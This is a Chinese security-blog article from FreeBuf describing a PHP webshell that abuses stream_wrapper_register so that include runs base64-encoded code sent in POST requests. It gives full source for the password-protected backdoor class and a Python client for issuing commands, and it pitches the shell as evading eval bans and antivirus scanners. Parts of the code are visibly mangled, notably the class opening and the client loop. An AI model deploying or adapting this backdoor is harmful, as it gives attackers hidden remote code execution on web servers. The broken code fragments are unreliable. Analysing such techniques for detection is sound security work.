## PHP使用流包装器实现WebShell

来源：[http://www.freebuf.com/articles/web/176571.html](http://www.freebuf.com/articles/web/176571.html)

时间 2018-07-07 09:04:55

 
* 本文作者：dxkite，本文属FreeBuf原创奖励计划，未经许可禁止转载
 
## 0×00 前言
 
在Web安全领域WebShell的构造与查杀是永不停息的话题，这几天发现了一种新型方式生成WebShell，隐蔽度高，目前安全查杀软件没法检测到相关的后门漏洞，不同于 eval 或则 asset 等方式运行后门，对于这两个函数禁用的情况下一样适用，目前除了禁用相关函数还暂时没有相关方式来避免漏洞。
 
## 0×01 后门原理
 
在PHP开发中，我们使用最为频繁的指令大概就是 include 指令， include 指令中一些比较普通的文件包含漏洞我们就忽略了，先来看看一串代码：
 
```php
include 'http://www.test.com/code.php'
```
 
我们通过这一串代码可以很容易的引用外部的PHP程序，但是前提是配置文件允许该行为被执行，先看看我的配置项
 
```php
;;;;;;;;;;;;;;;;;;
; Fopen wrappers ;
;;;;;;;;;;;;;;;;;;

; Whether to allow the treatment of URLs (like http:// or ftp://) as files.
; http://php.net/allow-url-fopen
allow_url_fopen =Off

; Whether to allow include/require to open URLs (like http:// or ftp://) as files.
; http://php.net/allow-url-include
allow_url_include = Off
```
 
从配置文件可以看到，allow_url_include 被我关闭了，也就是包含远程代码是不可能执行的，但是我们这里利用了一个东西。http:// 流，我们知道，在PHP中很多东西都是可以通过流包装器来使用的，比如常见的 php:// 流，我们可以通过 php://input 来获取输入流来读取请求体的内容，那么根据这个思路，我们能不能通过流包装器来实现代码执行？ **`答案是可行的`**  通过PHP函数 stream_wrapper_register 注册包装器，检测特定的URL包装功能，监控 include 流，在 include 流中动态生成PHP代码，我将通过如下代码执行一个 hello world 程序来证明这个过程
 
```php
include 'hello://dxkite';
```
 
### Hello Stream Wrapper 的实现
 
```php
code = "position = 0;
        return true;
    }

    public function stream_read($count)
    {
        $ret = substr($this->code, $this->position, $count);
        $this->position += strlen($ret);
        return $ret;
    }

    public function stream_tell()
    {
        return $this->position;
    }

    public function stream_eof()
    {
        return $this->position >= strlen($this->code);
    }

    public function stream_seek($offset, $whence)
    {
        switch ($whence) {
            case SEEK_SET:
                if ($offset < strlen($this->code) && $offset >= 0) {
                    $this->position = $offset;

                    return true;
                } else {
                    return false;
                }
                break;

            case SEEK_CUR:
                if ($offset >= 0) {
                    $this->position += $offset;
                    return true;
                } else {
                    return false;
                }
                break;
            case SEEK_END:
                if (strlen($this->code) + $offset >= 0) {
                    $this->position = strlen($this->code) + $offset;
                    return true;
                } else {
                    return false;
                }
                break;

            default:
                return false;
        }
    }
    public function stream_stat()
    {
        return stat(FILE);
    }
}

stream_wrapper_register('hello', HelloStream::class);
include 'hello://dxkite';
```
 
通过如上的代码，经过执行后，可以输出一个 hello world 
![][0]
 
## 0×02 后门示例
 
通过上述程序，我们实现了通过 include 指令直接执行 php ，并插入我们想要的效果，我们现在根据这个原理写一个Shell：
 
### 后门程序
 
```php
@link //dxkite.cn
 */

class ShellStream
{
    protected $position;
    protected $code;

    public function stream_open($path, $mode, $options, &$opened_path)
    {
        $url = parse_url($path);
        $name = $url["host"];
        $this->code = base64_decode($name);
        $this->position = 0;
        return true;
    }

    public function stream_read($count)
    {
        $ret = substr($this->code, $this->position, $count);
        $this->position += strlen($ret);
        return $ret;
    }

    public function stream_tell()
    {
        return $this->position;
    }

    public function stream_eof()
    {
        return $this->position >= strlen($this->code);
    }

    public function stream_seek($offset, $whence)
    {
        switch ($whence) {
            case SEEK_SET:
                if ($offset < strlen($this->code) && $offset >= 0) {
                    $this->position = $offset;
                    return true;
                } else {
                    return false;
                }
                break;

            case SEEK_CUR:
                if ($offset >= 0) {
                    $this->position += $offset;
                    return true;
                } else {
                    return false;
                }
                break;
            case SEEK_END:
                if (strlen($this->code) + $offset >= 0) {
                    $this->position = strlen($this->code) + $offset;
                    return true;
                } else {
                    return false;
                }
                break;

            default:
                return false;
        }
    }

    // include
    public function stream_stat()
    {
        return stat(FILE);
    }

    // file exists
    public function url_stat(string $path,int $stat)
    {
        return stat(FILE);
    }

    public static function shell(){
        stream_wrapper_register('shell', ShellStream::class);
        if (isset($_POST['password']) && $_POST['code']) {
            if ($_POST['password']=='dxkite') {
                $code = $_POST['code'];
                include 'shell://'.$code;
            } else {
                include 'shell://PD9waHAgZWNobyAiaGVsbG8gaGFjayI7';
            }
        }
    }
}

ShellStream::shell();
```
 
上述我实现了一个使用 $_POST 作为输入，接收密码和php代码的base64并执行代码的后门利用程序
 
```php
import requests 
import base64
import sys

def send_raw(url,password,cmd):
    res=requests.post(url,{
        'password':password,
        'code': base64.b64encode(cmd.encode('utf-8')) 
    })
    return res.text

def send_php_shell(url,password,cmd):
    return send_raw(url,password,'')
        if cmd == 'exit':
            break
        elif cmd.startswith('run'):
            cmd,path = cmd.split(' ',1)
            code = ''
            with open(path) as f:
                for line in f:
                    code = code + line + "\r\n" 
            response = send_raw(url,password,code);
            print(response)
        else:
            response = send_php_shell(url,password,cmd);
            print(response)
```
 
我们把我们的 shell.php 部署到服务器上，执行测试 shell.py ：
 
![][1]
 
其中，test.php 的内容为：
 
```php
<?php
    include 'PD9waHAgZWNobyAiaGVsbG8gc2hlbGxcclxuIjs';
    echo 'hello, shell world';
```
 
## 0×03 后门查杀
 
百度在线扫描
 
![][2]
 
安全狗本地扫描
 
![][3]
 


[0]: ./img/JjuaI3b.jpg 
[1]: ./img/uMJZB3f.jpg 
[2]: ./img/Yz2QjqB.jpg 
[3]: ./img/vEfyMjj.jpg 